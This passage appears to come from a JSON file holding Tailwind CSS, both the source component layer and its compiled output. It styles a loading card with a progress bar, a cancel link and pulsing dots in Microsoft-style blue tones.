    "\n        @layer components {\n            .glass-card {\n                @apply bg-white bg-opacity-90 backdrop-blur-lg;\n            }\n            \n            .progress-bar {\n                @apply h-1 w-full overflow-hidden bg-ms-light-blue relative;\n            }\n            \n            .progress-bar::after {\n                content: '';\n                @apply absolute top-0 left-0 h-full bg-ms-blue transition-all duration-500 ease-out;\n                animation: progress 2s ease-out infinite;\n            }\n            \n            @keyframes progress {\n                0% { width: 0%; left: 0%; }\n                50% { width: 30%; left: 35%; }\n                100% { width: 0%; left: 100%; }\n            }\n            \n            .cancelLink {\n                @apply text-ms-blue hover:text-ms-dark-blue hover:underline transition-colors font-medium;\n            }\n            \n            .dot {\n                @apply inline-block h-2 w-2 mx-1 rounded-full bg-ms-blue;\n                animation: dot-pulse 1.4s infinite ease-in-out;\n            }\n            \n            .dot:nth-child(1) {\n                animation-delay: 0s;\n            }\n            \n            .dot:nth-child(2) {\n                animation-delay: 0.2s;\n            }\n            \n            .dot:nth-child(3) {\n                animation-delay: 0.4s;\n            }\n            \n            @keyframes dot-pulse {\n                0%, 60%, 100% { transform: scale(1); opacity: 0.4; }\n                30% { transform: scale(1.5); opacity: 1; }\n            }\n        }\n    ",
    "*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, \"Apple Color Emoji\", \"Segoe UI Emoji\", \"Segoe UI Symbol\", \"Noto Color Emoji\";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, \"Liberation Mono\", \"Courier New\", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.glass-card{background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1));--tw-bg-opacity:0.9;--tw-backdrop-blur:blur(16px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.progress-bar{position:relative;height:0.25rem;width:100%;overflow:hidden;--tw-bg-opacity:1;background-color:rgb(204 227 245 / var(--tw-bg-opacity, 1))}.progress-bar::after {\n                content: '';\n                position:absolute;\n                top:0px;\n                left:0px;\n                height:100%;\n                --tw-bg-opacity:1;\n                background-color:rgb(0 120 212 / var(--tw-bg-opacity, 1));\n                transition-property:all;\n                transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);\n                transition-duration:500ms;\n                transition-timing-function:cubic-bezier(0, 0, 0.2, 1);\n                animation: progress 2s ease-out infinite;\n            }@keyframes progress {\n                0% { width: 0%; left: 0%; }\n                50% { width: 30%; left: 35%; }\n                100% { width: 0%; left: 100%; }\n            }.cancelLink{font-weight:500;--tw-text-opacity:1;color:rgb(0 120 212 / var(--tw-text-opacity, 1));transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.cancelLink:hover{--tw-text-opacity:1;color:rgb(16 110 190 / var(--tw-text-opacity, 1));-webkit-text-decoration-line:underline;text-decoration-line:underline}.dot{margin-left:0.25rem;margin-right:0.25rem;display:inline-block;height:0.5rem;width:0.5rem;border-radius:9999px;--tw-bg-opacity:1;background-color:rgb(0 120 212 / var(--tw-bg-opacity, 1));\n                animation: dot-pulse 1.4s infinite ease-in-out}.dot:nth-child(1) {\n                animation-delay: 0s;\n            }.dot:nth-child(2) {\n                animation-delay: 0.2s;\n            }.dot:nth-child(3) {\n                animation-delay: 0.4s;\n            }@keyframes dot-pulse {\n                0%, 60%, 100% { transform: scale(1); opacity: 0.4; }\n                30% { transform: scale(1.5); opacity: 1; }\n            }.fixed{position:fixed}.left-0{left:0px}.top-0{top:0px}.-z-10{z-index:-10}.mb-6{margin-bottom:1.5rem}.mb-8{margin-bottom:2rem}.mb-1{margin-bottom:0.25rem}.mb-10{margin-bottom:2.5rem}.mb-4{margin-bottom:1rem}.mt-4{margin-top:1rem}.flex{display:flex}.hidden{display:none}.h-32{height:8rem}.h-6{height:1.5rem}.h-full{height:100%}.min-h-screen{min-height:100vh}.w-32{width:8rem}.w-full{width:100%}.max-w-md{max-width:28rem}@keyframes slideUp{0%{transform:translateY(20px);opacity:0}100%{transform:translateY(0);opacity:1}}.animate-slide-up{animation:slideUp 0.6s ease-out forwards}@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}.animate-fade-in{animation:fadeIn 0.5s ease-in-out forwards}.flex-col{flex-direction:column}.items-center{align-items:center}.justify-center{justify-content:center}.overflow-hidden{overflow:hidden}.rounded-xl{border-radius:0.75rem}.border{border-width:1px}.border-0{border-width:0px}.border-white{--tw-border-opacity:1;border-color:rgb(255 255 255 / var(--tw-border-opacity, 1))}.border-opacity-30{--tw-border-opacity:0.3}.bg-gradient-to-b{background-image:linear-gradient(to bottom, var(--tw-gradient-stops))}.from-white{--tw-gradient-from:#fff var(--tw-gradient-from-position);--tw-gradient-to:rgb(255 255 255 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.to-ms-light-blue{--tw-gradient-to:#cce3f5 var(--tw-gradient-to-position)}.p-4{padding:1rem}.p-8{padding:2rem}.text-center{text-align:center}.text-2xl{font-size:1.5rem;line-height:2rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.font-semibold{font-weight:600}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39 / var(--tw-text-opacity, 1))}.text-ms-gray{--tw-text-opacity:1;color:rgb(96 94 92 / var(--tw-text-opacity, 1))}.opacity-40{opacity:0.4}.opacity-0{opacity:0}.shadow-xl{--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color), 0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.transition-opacity{transition-property:opacity;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-500{transition-duration:500ms}\n    "
  ]
}